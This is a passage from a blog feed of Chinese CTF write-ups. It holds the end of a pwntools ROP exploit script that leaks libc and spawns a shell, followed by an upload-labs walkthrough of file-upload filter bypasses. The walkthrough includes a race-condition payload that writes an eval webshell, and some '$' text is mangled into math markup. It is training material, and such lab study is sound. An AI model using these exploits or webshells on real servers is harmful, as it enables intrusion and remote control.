data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>ans <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>next_level_addr <span class=\"token operator\">=</span> level0_addr</pre></td></tr><tr><td data-num=\"158\"></td><td><pre><span class=\"token keyword\">for</span> level <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\tnext_level_addr<span class=\"token punctuation\">,</span> number <span class=\"token operator\">=</span> find_next<span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">,</span> level<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\tans <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>last_level_addr<span class=\"token punctuation\">,</span> number <span class=\"token operator\">=</span> find_last<span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>ans <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre></pre></td></tr><tr><td data-num=\"166\"></td><td><pre></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000406013</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>pop_rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000406011</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre></pre></td></tr><tr><td data-num=\"173\"></td><td><pre></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>ropchain <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0xd8</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rsi_r15<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"atoi\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x405EF7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>ropchain<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>atoi_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>libc_addr <span class=\"token operator\">=</span> atoi_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x0478c0</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>system_addr <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x0554e0</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>binsh_addr <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> \t<span class=\"token number\">0x1b6613</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"atoi_addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>atoi_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"system_addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh_addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>ropchain <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0xd8</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>ropchain <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>ropchain<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre></pre></td></tr><tr><td data-num=\"201\"></td><td><pre></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://example.com/2020/09/08/upload-labs/",
            "url": "http://example.com/2020/09/08/upload-labs/",
            "title": "upload-labs",
            "date_published": "2020-09-08T10:15:33.000Z",
            "content_html": "<p>文件上传</p>\n<p>漏洞成因： 具备上传文件功能的 Web 等应用，未对用户选择上传的文件进行校验，使得非法用户可通过上传可执行脚本而获取应用的控制权限。<br />\n防护与绕过： 通过 upload-labs 靶场，了解更多的防护与绕过手段。<br />\nupload-labs</p>\n<p>Pass-01（前端验证）</p>\n<ol>\n<li>\n<p>上传 php 一句话，弹窗提示。F12 发现表单提交时的 js 验证。</p>\n</li>\n<li>\n<p>类型不是.jpg|.png|.gif 时，验证失败，返回 false，直接修改表单处，相当于返回 true。<br />\n修改前：</p>\n</li>\n</ol>\n<p>修改后：</p>\n<ol start=\"3\">\n<li>上传成功，使用蚁剑连接。</li>\n</ol>\n<p>Pass-02（MIME 验证）<br />\n4.\t上传 php 一句话，网页加载（有发送请求）后，提示如下。</p>\n<ol start=\"5\">\n<li>\n<p>使用 BurpSuite 抓包，抓取上传图片的包和上传木马的包，比较后发现 Content-Type 的差别。</p>\n</li>\n<li>\n<p>修改上传木马包的 Content-Type 为 image/jpeg 后放包，上传成功，使用蚁剑连接。<br />\nPass-03（黑名单验证，特殊后缀）</p>\n</li>\n<li>\n<p>上传一句话，网页加载（有发送请求）后，提示如下，推测为黑名单验证。</p>\n</li>\n<li>\n<p>黑名单不全，可以使用大小写、‘.’号（如：1.php.）、特殊字符（如：1.php::$DATA）、Apache 文件后缀解析（1.php.xxx 为 1.php）等方式绕过，但查看源码后，发现都给过滤掉了。</p>\n</li>\n<li>\n<p>使用一些特殊的后缀。<br />\nphp：php3、php4、phtml<br />\njsp：jspx、jspf<br />\nasp：asa、cer<br />\n 使用特殊后缀之后，发现还是不行，返回结果为空，测试 &lt;?php phpinfo ();?&gt; 也读不出来。看 wp 和百度后，是由于环境是 phpstudy 搭建的，里面把后缀给限制了，所以改一下 httpd.conf 文件里的 #AddType application/x-httpd-php .php .phtml 为 AddType application/x-httpd-php .php .phtml .php3 .php4<br />\n 记得去掉 #号。<br />\n此处没有过滤.htaccess，可以先上传内容为：SetHandler application/x-httpd-php 的.htaccess 文件，含义：将所有文件解析为 php。然后上传个 jpg 格式的一句话也可以绕过了</p>\n</li>\n<li>\n<p>上传 1.php4，成功后查看图像地址，然后再使用蚁剑连接。</p>\n</li>\n</ol>\n<p>Pass-04（黑名单验证，.htaccess）<br />\n11.\t与 Pass-03 相似，还是黑名单，过滤得更多。<br />\n12.\t上传.htaccess 文件后，上传任意后缀包含一句话的马，连接上。<br />\nPass-05（黑名单验证，.user.ini.）<br />\n13.\t与前两关相似，再过滤了.htaccess，但是还有个 ini 配置文件可以利用。<br />\n14.\t先上传一个以 auto_prepend_file=1.gif 为内容的.user.ini 文件，然后再上传一个内容为 php 的一句话的脚本，命名为 1.gif，.user.ini 文件里的意思是：所有的 php 文件都自动包含 1.gif 文件。.user.ini 相当于一个用户自定义的 php.ini。<br />\n15.\t提示是：存在 readme.php 这个文件。</p>\n<ol start=\"16\">\n<li>复制图像地址后，将文件名改为 readme.php，然后密码设置为一句话的密码，蚁剑连接成功。<br />\n注：这里一开始我用的是 phpstudy 的 2016 版本，但是两个文件上传上去后 1.gif 还是没有给包含在 readme.php 里（使用蚁剑连接不上），然后后来换了个 v8.1 版本的，上传后可以成功连上。后来要手动配置 2016 版的 php 扩展设置，在选项那里输入 1.gif 后，给包含，但相当于服务端改了 php.ini 文件，利用方法不现实。为什么 2016 版的.user.ini 没有给 php.ini 扫描到呢？希望得到解决。</li>\n</ol>\n<p>Pass-06（黑名单验证，大小写绕过）<br />\n\t去除对文件后缀名的转为小写设定，直接选择后缀名为.Php 等非黑名单中存在的格式上传。<br />\nPass-07（黑名单验证，空格绕过）<br />\n\t去除了对文件后缀名的空格过滤，选择后缀为.php 的一句话上传，抓包后在后面增加空格，成功绕过。（空格不明显）</p>\n<p>Pass-08（黑名单验证，点号绕过）<br />\n\t去除了对文件后缀名的点号过滤，选择选择后缀为.php 的一句话上传，抓包后在后面增加点，成功绕过。</p>\n<p>Pass-09（黑名单验证，特殊字符::DATA绕过）\n\t去除了对字符串::DATA 的过滤，选择选择后缀为.php 的一句话上传，抓包后在后面增加::$DATA，上传成功。</p>\n<p>注：复制图像地址时，会附带::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>，要去掉后再连接，否则找不到文件。</mtext><mi>P</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>−</mo><mn>10</mn><mtext>（黑名单）</mtext><mn>17.</mn><mtext>查看源码后，发现其路径拼接的是</mtext></mrow><annotation encoding=\"application/x-tex\">DATA，要去掉后再连接，否则找不到文件。\nPass-10（黑名单）\n17.\t查看源码后，发现其路径拼接的是</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathdefault\">A</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">要</span><span class=\"mord cjk_fallback\">去</span><span class=\"mord cjk_fallback\">掉</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">再</span><span class=\"mord cjk_fallback\">连</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">否</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">找</span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">到</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">s</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord cjk_fallback\">（</span><span class=\"mord cjk_fallback\">黑</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">单</span><span class=\"mord cjk_fallback\">）</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">.</span><span class=\"mord cjk_fallback\">查</span><span class=\"mord cjk_fallback\">看</span><span class=\"mord cjk_fallback\">源</span><span class=\"mord cjk_fallback\">码</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">发</span><span class=\"mord cjk_fallback\">现</span><span class=\"mord cjk_fallback\">其</span><span class=\"mord cjk_fallback\">路</span><span class=\"mord cjk_fallback\">径</span><span class=\"mord cjk_fallback\">拼</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">是</span></span></span></span> file_name 而不是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>e</mi></msub><mi>x</mi><mi>t</mi><mtext>，而</mtext></mrow><annotation encoding=\"application/x-tex\">file_ext，而</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathdefault mtight\">e</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">t</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">而</span></span></span></span> file_name 只处理了文件名末尾的点。</p>\n<ol start=\"18\">\n<li>选择后缀为.php 的一句话上传，抓包后构造文件后缀为 php. .，成功绕过，再使用蚁剑连接。</li>\n</ol>\n<p>Pass-11（黑名单验证，双写绕过）<br />\n\t查看源码后，发现其对存在黑名单中的字符进行替换，但 str_ireplace () 函数只替换一次，因此修改文件名为 1.pphphp 后成功绕过。</p>\n<p>Pass-12（白名单验证，0x00 截断）<br />\n19.\t查看源码和提示，上传路径可控，并且是最终文件的存放位置是以拼接的方式，可以使用 %00 截断，但需要 php 版本 &lt; 5.3.4，并且 magic_quotes_gpc 关闭。原理是：php 的一些函数的底层是 C 语言，而 move_uploaded_file 就是其中之一，遇到 0x00 会截断，0x 表示 16 进制，URL 中 %00 解码成 16 进制就是 0x00。</p>\n<ol start=\"20\">\n<li>修改一句话的后缀名为.jpg 后上传，抓包后修改 URL，成功上传，复制图像地址后去掉 php 后的部分，然后用蚁剑连接。</li>\n</ol>\n<p>Pass-13（白名单验证，0x00 截断）<br />\n21.\t与 Pass-12 的区别是这里使用 POST 传地址，POST 不会对里面的数据自动解码，需要在 Hex 中修改。</p>\n<ol start=\"22\">\n<li>修改一句话的后缀名为.jpg 后上传，抓包后，修改路径处，增加 1.php，然后选择 Hex 后，找到增加的 1.php 位置，将 p 后的 0d（不同字符不同）修改为 00 后放包上传。同样复制图像地址后去掉 php 后的部分，然后用蚁剑连接。</li>\n</ol>\n<p>Pass-14（白名单验证，图片马）<br />\n23.\t上传图片马，查看源码后，意思是：读取上传文件的前两个字节内容，unpack 解码后，使用 intval 转换为 10 进制，默认为 10 进制，根据转换后的结果判断图片类型。</p>\n<ol start=\"24\">\n<li>制作图片马，copy 1.jpg/b + 1.jpg/a 2.jpg，2.jpg 就是生成的图片马。</li>\n<li>上传成功后，利用文件包含解析图片马里的 php 脚本，file 为我们的图片马位置。</li>\n</ol>\n<p>Pass-15（白名单验证，图片马）<br />\n\t与 Pass-14 相同，上传同个图片马就可以。相关函数说明：<br />\ngetimagesize(string filename [,array &imageinfo])// 获取图像信息，返回一个数组 /* 返回的数组中，索引 0：图像宽度像素值     索引 1：图像高度像素值     索引 2：图像类型，1=GIF，2=JPG，3=PNG，4=SWF，5=PSD，6=BMP，7=TIFF_II，8=TIFF_MM，9=JPC，10=JP2，11=JPX，12=JB2，13=SWC，14=IFF，15=WBMP，16=XBM，17=ICO，18=COUNT     索引 3：图像宽度和高度的字符串     索引 bits：图像的每种颜色的位数，二进制格式     索引 channels：图像的通道值     索引 mime：图像的 MIME 信息 <em>/image_type_to_extension (int $imagetype [,bool $include_dot = TRUE])// 获取图像类型的文件扩展名 /</em>include_dot 是否在扩展名前加点。默认为 TRUE */</p>\n<p>Pass-16（白名单验证，图片马）<br />\n\t与 Pass-14 相同，上传同个图片马就可以。相关函数说明：<br />\n此函数需要开启 php_exif 模块<br />\n exif_imagetype (string $filename)// 读取一个图像的第一个字节并检查其签名</p>\n<p>Pass-17（白名单验证，图片马 + 二次渲染）<br />\n26.\t验证过程：判断后缀与 MIME 类型是否符合要求，符合后生成新图像（内容不正确会失败，返回 false，相当于多了一次验证），生成新图像失败就 unlink 删除，成功就根据系统时间给文件命名，再通过 imagejpeg 类似函数使用原图像资源创建新图像（二次渲染）。相关函数说明：<br />\nbasename (string $path [,string $suffix]) // 返回路径中的文件名部分 imagecreatefromjpeg (string $filename) imagecreatefrompng (string $filename)  imagecreatefromgif (string $filename) // 由文件或 URL 创建一个新图像，内容不对则失败返回 false，成功后返回图像资源 srand ([int $seed ]) // 用 seed 播下随机数发生器种子 strval (mixed $var) // 返回字符串类型的 varimagejpeg (resource $image [,string $filename [,int $quality]])// 从 image 图像以 filename 为文件名创建一个 JPEG 图像 imagepng (resource $image [,string $filename]) // 从 image 图像以 filename 为文件名创建一个 PNG 图像或文件 imagegif (resource $image [,string $filename]) // 从 image 图像以 filename 为文件名创建一个 GIF 图像或文件</p>\n<ol start=\"27\">\n<li>绕过过程：这里用 gif，容易绕过二次渲染，上传图片马 2.gifcopy 1.gif/b + 1.php/a 2.gif，然后另存上传的图片马，使用查看被渲染后哪里保持不变，将一句话插入到不变的位置中去，保存图片马，再次上传，复制新上传的图像位置，使用蚁剑连接成功。</li>\n</ol>\n<p>Pass-18（白名单验证，条件竞争）<br />\n28.\t验证过程：服务器先将上传的文件保存在临时目录中，然后再对后缀名进行白名单验证，并重命名。<br />\nrename (string $oldname,string $newname [,resource $context])// 把 oldname 重命名为 newname</p>\n<ol start=\"29\">\n<li>绕过过程：不断上传文件，在文件还没被删除前去读取文件，若上传内容为 &lt;?php fputs (fopen ('2.php','w'),'&lt;?php @eval (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><mo stretchy=\"false\">[</mo><mi mathvariant=\"normal\">&quot;</mi><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant=\"normal\">&quot;</mi><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">?</mo><msup><mo>&gt;</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">)</mo><mo separator=\"true\">;</mo><mo stretchy=\"false\">?</mo><mo>&gt;</mo><mtext>，则还没被删除前去读取文件，解析之后会写入一个内容为</mtext><mo>&lt;</mo><mo stretchy=\"false\">?</mo><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant=\"normal\">@</mi><mi>e</mi><mi>v</mi><mi>a</mi><mi>l</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">_POST[&quot;pass&quot;])?&gt;&#x27;);?&gt;，则还没被删除前去读取文件，解析之后会写入一个内容为&lt;?php @eval(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">[</span><span class=\"mord\">&quot;</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">s</span><span class=\"mord\">&quot;</span><span class=\"mclose\">]</span><span class=\"mclose\">)</span><span class=\"mclose\">?</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">&gt;</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mclose\">)</span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mclose\">?</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">还</span><span class=\"mord cjk_fallback\">没</span><span class=\"mord cjk_fallback\">被</span><span class=\"mord cjk_fallback\">删</span><span class=\"mord cjk_fallback\">除</span><span class=\"mord cjk_fallback\">前</span><span class=\"mord cjk_fallback\">去</span><span class=\"mord cjk_fallback\">读</span><span class=\"mord cjk_fallback\">取</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">解</span><span class=\"mord cjk_fallback\">析</span><span class=\"mord cjk_fallback\">之</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">会</span><span class=\"mord cjk_fallback\">写</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">内</span><span class=\"mord cjk_fallback\">容</span><span class=\"mord cjk_fallback\">为</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mclose\">?</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">p</span><span class=\"mord\">@</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mopen\">(</span></span></span></span>_POST [&quot;pass&quot;])?&gt; 的 2.php 文件。使用 BurpSuite 的 Intruder 不断上传文件并不断访问所上传的文件。<br />\n注：&quot;pass&quot; 一定要双引号，不然单引号之间乱了。</li>\n<li>观察到有 200 的响应包，用蚁剑连接。2.php</li>\n</ol>\n<p>Pass-19（白名单验证，条件竞争）<br />\n31.\t验证过程：依次检查文件是否存在、文件名是否可写、检查后缀（白名单）、检查文件大小、检查临时文件存在、保存到临时目录里、然后再重命名。与 Pass-18 存在同样的条件竞争。不同的是这里先检查了后缀，所以要上传符合白名单里的才能进行。<br />\n32.\t任务是上传 webshell，但是不知道怎么做，可以通过之前的文件包含和 Pass-18 的条件竞争，上传一个图片马，然后不断访问，写入一个 webshell。<br />\n33.\t怎么才能直接上传 webshell？？？<br />\nPass-20（黑名单验证，点号绕过）<br />\n34.\t同样是上传路径可控，可以使用和 Pass-13 同样的方式绕过。不同的是这里的黑名单，可以文件名称保存的时候，加上.，最末的。号使得 pathinfo () 获取到的 PATHINFO_EXTENSION 为空，从而绕过黑名单。<br />\npathinfo (string $path [,int $options = PATHINFO_DIRNAME | PATHINFO_BASENAME | PATHINFO_EXTENSION | PATHINFO_FILENAME])  /* 返回一个关联数组包含有 path 的信息。返回关联数组还是字符串取决于 options PATHINFO_DIRNAME：文件所在目录 PATHINFO_BASENAME：文件 + 后缀名 PATHINFO_EXTENSION：后缀名 PATHINFO_FILENAME：文件名 */</p>\n<ol start=\"35\">\n<li>上传，再用蚁剑连接。</li>\n</ol>\n<p>Pass-21（白名单验证，数组绕过）<br />\n36.\t验证过程：先检查 MIME，通过后检查文件名，保存名称为空的就用上传的文件名。再判断文件名是否是 array 数组，不是的话就用 explode () 函数通过。号分割成数组。然后获取最后一个，也就是后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。<br />\nexplode(string $delimiter , string $string [, int limit])//返回由字符串组成的数组，每个元素都是string的一个子串，它们被字符串delimiter作为边界点分割出来 reset(array &array)// 将数组的内部指针指向第一个单元<br />\n 37.\t绕过过程：绕过 MIMIE，改一下包的 Content-Type，为了绕过 explode () 函数，需要传入数组，绕过白名单，由于取的是 end () 也就是数组最后一个，需要传入数组的最后一个为 jpg|png|gif，最后是拼接文件名，取的是 reset () 第一个，即索引为 0，和索引 count ()-1（数组内元素个数 - 1）。所以令索引 0 为 1.php，索引 2 为 jpg（只要是索引 1 之后都可），这样数组元素个数为 2，拼接的就是索引 0 和索引 1，也就是 1.php 和空，结果还是 1.php，这样就可以使得拼接后的文件名为 1.php。如下：</p>\n<p>用到的部分函数说明<br />\n<span class=\"katex\"><span 